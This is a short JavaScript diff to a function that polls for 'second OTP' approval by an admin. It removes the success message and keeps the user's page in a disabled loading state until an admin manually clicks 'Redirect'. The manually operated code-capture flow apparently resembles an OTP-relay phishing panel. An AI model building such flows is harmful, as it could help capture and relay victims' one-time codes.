@@ -336,20 +336,10 @@ function startCheckingSecondApproval() {
       });
       const data = await res.json();
       
-      console.log('Approval check response:', data);
-      
       if (data.approved === true) {
-        console.log('Second OTP Approved by admin! Waiting for redirect...');
         clearInterval(approvalInterval);
-        // DO NOT REDIRECT - just show a success message
-        verifyBtn.disabled = false;
-        verifyBtn.innerHTML = 'Verify';
-        errorDiv.textContent = '✅ Code verified! Waiting for admin to redirect...';
-        errorDiv.style.backgroundColor = '#d1fae5';
-        errorDiv.style.color = '#065f46';
-        errorDiv.style.display = 'block';
-        // Clear the waiting/validating state
-        isProcessing = false;
+        // DO NOTHING - stay on page, button stays disabled/loading
+        // Admin will click Redirect button when ready
       }
     } catch (e) {
       console.error('Approval polling error:', e);
